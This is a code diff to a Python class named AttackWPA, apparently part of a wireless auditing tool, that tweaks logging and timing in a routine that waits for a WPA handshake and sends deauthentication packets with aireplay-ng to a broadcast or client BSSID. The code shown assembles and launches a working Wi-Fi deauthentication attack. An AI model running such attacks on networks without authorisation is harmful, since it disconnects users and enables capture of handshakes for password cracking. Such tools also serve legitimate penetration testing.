@@ -27,6 +27,7 @@ class AttackWPA(Attack):
                       target_bssid=self.target.bssid,
                       output_file_prefix='wpa') as airodump:
 
+            Color.clear_line()
             Color.p('\r{+} {O}waiting{W} for target to appear...')
             airodump_target = self.wait_for_target(airodump)
  
@@ -40,9 +41,9 @@ class AttackWPA(Attack):
             deauth_proc = None
 
             while True:
+                time.sleep(1)
                 Color.clear_line()
                 Color.p('\r{+} waiting for {C}handshake{W}...')
-                time.sleep(1)
 
                 # Find .cap file
                 cap_files = airodump.find_files(endswith='.cap')
@@ -75,11 +76,9 @@ class AttackWPA(Attack):
                     # We are N seconds since last deauth was sent,
                     # And the deauth process is not running.
                     if len(clients) == 0 or client_index >= len(clients):
-                        # TODO: Send deauth for broadcast
                         deauth_proc = self.deauth(airodump_target.bssid)
                         client_index = 0
                     else:
-                        # TODO: Send deauth for client
                         client = clients[client_index]
                         deauth_proc = self.deauth(client.bssid)
                         client_index += 1
@@ -183,6 +182,9 @@ class AttackWPA(Attack):
                                 Deauths 'broadcast' if no client is specified.
         '''
         # TODO: Print that we are deauthing and who we are deauthing!
+        target_name = station_bssid
+        if target_name == None:
+            target_name = 'broadcast'
         command = [
             'aireplay-ng',
             '--ignore-negative-one',
@@ -193,6 +195,7 @@ class AttackWPA(Attack):
             # Deauthing a specific client
             command.extend(['-h', station_bssid])
         command.append(Configuration.interface)
+        Color.p(' {C}sending deauth{W} to {C}%s{W}' % target_name)
         return Process(command)
 
 if __name__ == '__main__':
